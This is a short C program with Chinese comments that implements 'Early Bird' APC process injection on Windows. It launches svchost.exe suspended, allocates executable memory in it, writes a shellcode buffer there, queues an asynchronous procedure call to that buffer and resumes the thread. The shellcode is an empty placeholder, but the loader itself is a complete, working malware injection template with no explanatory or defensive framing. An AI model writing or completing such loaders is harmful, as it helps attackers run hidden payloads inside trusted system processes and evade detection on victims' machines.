#include <windows.h>
#include <tchar.h>

int main() {
    // 1. 定义shellcode
    UINT shellcodeSize = 0;
    unsigned char* shellcode = "";

    // 2. 创建挂起的远程线程
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
    HANDLE victimProcess = pi.hProcess;
    HANDLE threadHandle = pi.hThread;
    LPVOID shellAddress = VirtualAllocEx(victimProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // 3. 将APC插入目标线程并执行
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
    WriteProcessMemory(victimProcess, shellAddress, shellcode, shellcodeSize, NULL);
    QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
    ResumeThread(threadHandle);

    // 等待目标线程执行完毕
    WaitForSingleObject(threadHandle, INFINITE);

    // 释放资源
    CloseHandle(threadHandle);
    CloseHandle(victimProcess);

    return 0;
}
